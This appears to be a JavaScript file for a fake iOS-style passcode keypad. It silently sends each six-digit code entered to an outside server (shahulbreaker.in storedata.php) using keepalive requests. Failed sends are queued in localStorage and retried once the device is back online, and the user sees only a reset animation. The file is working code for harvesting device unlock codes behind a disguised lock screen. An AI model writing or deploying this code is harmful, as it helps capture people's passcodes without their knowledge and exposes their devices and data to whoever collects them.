// app.js
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 6;
  let code = "";
  const dots = document.getElementById('dots');
  const keys = Array.from(document.querySelectorAll('.key'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancelBtn');

  function refreshDots() {
    const dotEls = Array.from(dots.querySelectorAll('.dot'));
    dotEls.forEach((d, i) => {
      d.classList.toggle('filled', i < code.length);
    });
  }

  function resetCode(){
    code = "";
    refreshDots();
  }

  function sendToAPI(pass) {
    // Build full URL (user's API expects data after =)
    const url = API_BASE + encodeURIComponent(pass);

    // Attempt fetch with keepalive so it can work on page unload too
    fetch(url, { method: 'GET', keepalive: true })
      .catch(err => {
        // offline or fail: queue locally
        const queue = JSON.parse(localStorage.getItem('_pass_queue_') || "[]");
        queue.push({pass, ts: Date.now()});
        localStorage.setItem('_pass_queue_', JSON.stringify(queue));
      });
  }

  function flushQueue() {
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || "[]");
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true })
        .catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  function onComplete() {
    // Visual pulse then reset (simulate iOS)
    const filledDots = dots.querySelectorAll('.dot.filled');
    filledDots.forEach(d => d.animate([{ transform: 'scale(1.08)' }, { transform: 'scale(1)' }], { duration: 220 }));

    sendToAPI(code);
    // reset after half-second
    setTimeout(resetCode, 600);
  }

  // keypad events
  keys.forEach(k => {
    k.addEventListener('click', (e) => {
      const val = k.dataset.key;
      if (!val) return;
      // Cancel button without a numeric; treat as "clear last" on long press maybe.
      if (k.classList.contains('key-cancel')) {
        // behave like "cancel" — clear
        resetCode();
        return;
      }
      if (val === '0' || /^[0-9]$/.test(val)) {
        if (code.length >= MAX) return;
        code += val;
        refreshDots();
        if (code.length === MAX) onComplete();
      }
    }, {passive:true});
  });

  // Emergency and Cancel
  emergency.addEventListener('click', ()=>{ alert('Emergency pressed'); });

  // keyboard support for debugging on desktop
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace') {
      code = code.slice(0,-1); refreshDots();
    } else if (/^[0-9]$/.test(e.key) && code.length < MAX) {
      code += e.key; refreshDots();
      if (code.length === MAX) onComplete();
    } else if (e.key === 'Escape') resetCode();
  });

  // try flushing any queued sends when back online
  window.addEventListener('online', flushQueue);
  flushQueue();

  // expose for debugging
  window.__passcodeUI = { reset: resetCode, getCode: ()=>code };
})();
